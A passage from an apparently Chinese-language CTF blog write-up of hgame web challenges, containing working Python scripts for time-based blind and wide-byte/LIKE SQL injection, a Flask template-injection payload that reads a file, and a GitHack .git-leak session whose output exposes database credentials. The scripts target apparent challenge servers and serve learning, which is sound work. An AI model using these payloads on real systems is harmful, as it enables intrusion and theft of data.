+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        <span class="comment">#data=&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;.format(num=num,ascii1=each)</span></span><br><span class="line">        <span class="comment">#data=&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;user&quot;),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;.format(num=num,ascii1=each)</span></span><br><span class="line">        data=<span class="string">&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select flag from user limit 0,1),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(num=num,ascii1=each)</span><br><span class="line"></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;name=&quot;</span>+base64.b64encode(data.encode()).decode()&#125;                    </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://123.206.203.108:10010/normalSQLi/index.php&#x27;</span>,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>表:user 列:id,flag,username 然后注意最后提取flag的时候limit一下,在limit 2,1的时候找到flag flag:hgame{fLag\_1s\_h4re.....}</p>
+<h3 id="书店"><a href="#书店" class="headerlink" title="**书店"></a>**书店</h3><p>hint:外部实体 一发blind xxe 详情见前一篇moctf的题解最后一题 hgame{Xxe\_v3ry\_funny!!!!}</p>
+<h3 id="ngc’s-blog"><a href="#ngc’s-blog" class="headerlink" title="ngc’s blog"></a>ngc’s blog</h3><p>一开始没啥思路,然后信息收集一下 发现是flask,猜想sstl,然后试了一下 访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa&#123;&#123;7+7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa14</span><br></pre></td></tr></table></figure>
+
+<p>即猜想正确 直接去搞flag就ok,推荐文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tyomcat/p/5440488.html">https://www.cnblogs.com/tyomcat/p/5440488.html</a> 直接访问:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag:hgame{skdvhdsbvadvnjVADBVS}</p>
+<h3 id="又双叒叕是SQLI"><a href="#又双叒叕是SQLI" class="headerlink" title="又双叒叕是SQLI"></a>又双叒叕是SQLI</h3><p>index.php~泄漏拿到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line">    <span class="variable">$waf</span>=<span class="string">&quot;/(sleepbenchmarkuniongroup by=&gt;&lt;hex lowerstrcmpupdatexmlxmlelementextractvalueconcatbinsleepmid\(substrleftascii\/\*\*\/)/i&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$waf</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$user</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$user</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&#x27;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $user.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$passwd</span>,<span class="variable">$database</span>);</span><br><span class="line">        <span class="variable">$sqli</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;select * from users where username=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$sqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        <span class="comment">//echo $sqli-&gt;error;</span></span><br><span class="line">        <span class="variable">$num</span>=<span class="number">0</span>;</span><br><span class="line">        @<span class="variable">$num</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&quot;    &quot;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&quot;   &quot;</span>.<span class="variable">$row</span>[<span class="number">2</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure>
+
+<p>看了一下,like没过滤,放个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">res = []</span><br><span class="line">ok=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        <span class="comment">#payload = &quot;lalalala%df&#x27;or(select(table_name)from(information_schema.tables)where(table_schema%0alike%0adatabase())limit%0a0,1)like\&quot;&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;lalalala%df&#x27;or(select(column_name)from(information_schema.columns)where(table_name%0alike\&quot;flllllag\&quot;)limit%0a1,1)like\&quot;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;lalalala%df&#x27;or(select%0athisisflag%0afrom(flllllag)limit%0a0,1)like%0a0x&quot;</span></span><br><span class="line">        payload = <span class="built_in">list</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(each)!=<span class="string">&#x27;%&#x27;</span> <span class="keyword">and</span> <span class="built_in">chr</span>(each)!=<span class="string">&quot;_&quot;</span>:</span><br><span class="line">            res.append(<span class="built_in">str</span>(<span class="built_in">hex</span>(each))[<span class="number">2</span>:])</span><br><span class="line">            payload.append(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">            payload.append(<span class="string">&#x27;25%23&#x27;</span>)</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://118.25.18.223:10088/?user=&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(payload))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;guest&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="string">&quot;5c&quot;</span>)</span><br><span class="line">            res.append(<span class="built_in">str</span>(<span class="built_in">hex</span>(each))[<span class="number">2</span>:])</span><br><span class="line">            payload.append(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">            payload.append(<span class="string">&#x27;25%23&#x27;</span>)</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://118.25.18.223:10088/?user=&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(payload))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;guest&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.pop()</span><br><span class="line">                res.pop()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>拿到flag hgame{like!injection!so!g00d##}</p>
+<h3 id="散落的flag"><a href="#散落的flag" class="headerlink" title="散落的flag"></a>散落的flag</h3><p>考的前端,做出来了都还没发现… 看个js,发现</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_userinfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> user = $(<span class="string">&quot;#user&quot;</span>).<span class="title function_">text</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123; </span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;check_user.php&quot;</span>,   </span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>, </span><br><span class="line">        <span class="attr">data</span>:&#123;<span class="attr">username</span>:user&#125;, </span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>, </span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;   </span><br><span class="line">            $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">html</span>(<span class="string">&#x27;Error loading XML document&#x27;</span>);   </span><br><span class="line">        &#125;,   </span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data,status</span>)&#123;</span><br><span class="line">           $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;username: &quot;</span>+data[<span class="number">0</span>]);</span><br><span class="line">           $(<span class="string">&quot;#secret&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;secret: &quot;</span>+data[<span class="number">1</span>]);</span><br><span class="line">        &#125; </span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="title function_">get_userinfo</span>());</span><br></pre></td></tr></table></figure>
+
+<p>然后去ff的hackbar发包, 发个admin拿到10c546b2cf68 发个admin1拿到hgame{0102940de1 注册然后找回密码拿到98924acfce} 合并一下 hgame{0102940de110c546b2cf6898924acfce} 话说我做的时候有人把密码改成了123456,我直接就拿到了最后一个flag,就感觉很ez…</p>
+<h3 id="奇怪的SQLi"><a href="#奇怪的SQLi" class="headerlink" title="奇怪的SQLi"></a>奇怪的SQLi</h3><p>环境差不多配好了:<a target="_blank" rel="noopener" href="http://119.28.22.85:12345/">http://119.28.22.85:12345</a> 但是gopher似乎连不上sql..也可能是我配置的问题 首先.git泄漏,githack一发,之前那个脚本不行..搞不到log,推荐一个脚本 <a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/GitHack" title="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> 然后拿到之后log一下,然后reset一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# python GitHack.py http://119.28.22.85:12345/.git</span><br><span class="line"></span><br><span class="line">  ____ _ _   _   _            _</span><br><span class="line"> / ___(_) _    __ _  ___  __</span><br><span class="line">   _  __ _ / _` / __ / /</span><br><span class="line"> _   _  _   (_  (__   &lt;</span><br><span class="line"> \_____\___ _\__,_\____\_\&#123;0.0.5&#125;</span><br><span class="line"> A &#x27;.git&#x27; folder disclosure exploit.</span><br><span class="line"></span><br><span class="line">[*] Check Depends</span><br><span class="line">[+] Check depends end</span><br><span class="line">[*] Set Paths</span><br><span class="line">[*] Target Url: http://119.28.22.85:12345/.git/</span><br><span class="line">[*] Initialize Target</span><br><span class="line">[*] Try to Clone straightly</span><br><span class="line">[*] Clone</span><br><span class="line">Cloning into &#x27;/home/ubuntu/GitHack/dist/119.28.22.85_12345&#x27;...</span><br><span class="line">fatal: repository &#x27;http://119.28.22.85:12345/.git/&#x27; not found</span><br><span class="line">[-] Clone Error</span><br><span class="line">[*] Try to Clone with Directory Listing</span><br><span class="line">[*] http://119.28.22.85:12345/.git/ is not support Directory Listing</span><br><span class="line">[-] [Skip][First Try] Target is not support Directory Listing</span><br><span class="line">[*] Try to clone with Cache</span><br><span class="line">[*] Initialize Git</span><br><span class="line">[*] Cache files</span><br><span class="line">[*] packed-refs</span><br><span class="line">[*] config</span><br><span class="line">[*] HEAD</span><br><span class="line">[*] COMMIT_EDITMSG</span><br><span class="line">[*] FETCH_HEAD</span><br><span class="line">[*] /refs/heads/master</span><br><span class="line">[*] index</span><br><span class="line">[*] logs/HEAD</span><br><span class="line">[*] refs/heads/master</span><br><span class="line">[*] logs/refs/heads/master</span><br><span class="line">[*] Fetch Commit Objects</span><br><span class="line">[*] objects/e6/f0a50eaedaa25a44083a3f832a264cea3ba13a</span><br><span class="line">[*] objects/e2/f3ab9cf26f6534d9f04cb4bbbfc7770f3486ee</span><br><span class="line">[*] objects/32/2224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">[*] objects/dd/45ee5b5130bde3febd21ccb823d1a9cb341fb5</span><br><span class="line">[*] objects/98/acd10c8f8a476b279e391a4994fd1413a00800</span><br><span class="line">[*] objects/60/019e79f3d3f4d72da7bfcbafcb44cda0da8a84</span><br><span class="line">[*] objects/0d/abdd663cc60676956c8090d0f48e63b4456c03</span><br><span class="line">[*] objects/21/1fcb8891233bebe0aa087642123c3b43e8d3b0</span><br><span class="line">[*] objects/da/51001a93a4c74f4159b562449328ce16b90fe3</span><br><span class="line">[*] objects/97/43c8a21fe4e953da555ac0f14d4ca4a1bd4302</span><br><span class="line">[*] objects/db/c5e076915b5c190cc5922d15f705b6f5a4c13a</span><br><span class="line">[*] objects/a9/a17e440192ca8ff4c69e52bbecadba78ef4140</span><br><span class="line">[*] objects/89/a72a47dd1e777db9c845cf31a569c9df791134</span><br><span class="line">[*] Fetch Commit Objects End</span><br><span class="line">[*] refs/stash</span><br><span class="line">[*] Valid Repository</span><br><span class="line">[+] Valid Repository Success</span><br><span class="line"></span><br><span class="line">[+] Clone Success. Dist File : /home/ubuntu/GitHack/dist/119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# ls</span><br><span class="line">data  dist  GitHack.py  lib  LICENSE  README.md</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# cd dist</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist# ls</span><br><span class="line">119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist# cd 119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# ls</span><br><span class="line">css  index.html  index.php  login.html  login.php  register.html  register.php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# git log</span><br><span class="line">commit e6f0a50eaedaa25a44083a3f832a264cea3ba13a</span><br><span class="line">Author: blacsheep &lt;784522717@qq.com&gt;</span><br><span class="line">Date:   Thu Mar 8 15:16:38 2018 +0000</span><br><span class="line"></span><br><span class="line">    remove config</span><br><span class="line"></span><br><span class="line">commit 322224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">Author: blacsheep &lt;784522717@qq.com&gt;</span><br><span class="line">Date:   Thu Mar 8 15:15:17 2018 +0000</span><br><span class="line"></span><br><span class="line">    add php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# git reset --hard 322224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">HEAD is now at 322224a add php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# ls</span><br><span class="line">config.php  css  index.html  index.php  login.html  login.php  register.html  register.php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# cat config.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$db_host = &#x27;localhost&#x27;;</span><br><span class="line">$db_name = &#x27;week4&#x27;;</span><br><span class="line">$db_user = &#x27;blacsheep&#x27;;</span><br><span class="line">$db_pwd = &#x27;cnss&#x27;;</span><br><span class="line">$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);</span><br><span class="line">if(!$conn)&#123;</span><br><span class="line">    die(mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# </span><br></pre></td></tr></table></figure>
+
+<p>然后拿到mysql的帐号密码,然后有个ssrf,gopher打mysql 推荐文章:<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/159342.html">http://www.freebuf.com/articles/web/159342.html</a> exp:<a target="_blank" rel="noopener" href="https://github.com/undefinedd/extract0r-">https://github.com/undefinedd/extract0r-</a> 跑一下拿到flag,本地环境等有时间我再去弄一下吧..</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-from-Europe"><span class="toc-number">1.</span> <span class="toc-text">Are you from Europe?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#special-number"><span class="toc-number">2.</span> <span class="toc-text">special number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-u-find-me"><span class="toc-number">3.</span> <span class="toc-text">can u find me?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tell-me-what-you-want"><span class="toc-number">4.</span> <span class="toc-text">tell me what you want</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E4%B8%8D%E4%B8%80%E6%A0%B7"><span class="toc-number">5.</span> <span class="toc-text">我们不一样</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Random"><span class="toc-number">6.</span> <span class="toc-text">Random?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8D%89%E8%8E%93%E7%A4%BE%E5%8C%BA-2"><span class="toc-number">7.</span> <span class="toc-text">草莓社区-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8D%89%E8%8E%93%E7%A4%BE%E5%8C%BA-1"><span class="toc-number">8.</span> <span class="toc-text">草莓社区-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-1"><span class="toc-number">9.</span> <span class="toc-text">xss-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-2"><span class="toc-number">10.</span> <span class="toc-text">xss-2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload"><span class="toc-number">10.0.1.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84sql%E9%A2%98"><span class="toc-number">11.</span> <span class="toc-text">最简单的sql题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%81%E5%88%86%E7%9A%84SQLi"><span class="toc-number">12.</span> <span class="toc-text">送分的SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84SQLi"><span class="toc-number">13.</span> <span class="toc-text">简单的SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E7%9A%84SQLi"><span class="toc-number">14.</span> <span class="toc-text">正常的SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%A6%E5%BA%97"><span class="toc-number">15.</span> <span class="toc-text">**书店</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ngc%E2%80%99s-blog"><span class="toc-number">16.</span> <span class="toc-text">ngc’s blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%98%AFSQLI"><span class="toc-number">17.</span> <span class="toc-text">又双叒叕是SQLI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%A3%E8%90%BD%E7%9A%84flag"><span class="toc-number">18.</span> <span class="toc-text">散落的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84SQLi"><span class="toc-number">19.</span> <span class="toc-text">奇怪的SQLi</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&text=hgame-webwp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&is_video=false&description=hgame-webwp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hgame-webwp&body=Check out this article: http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
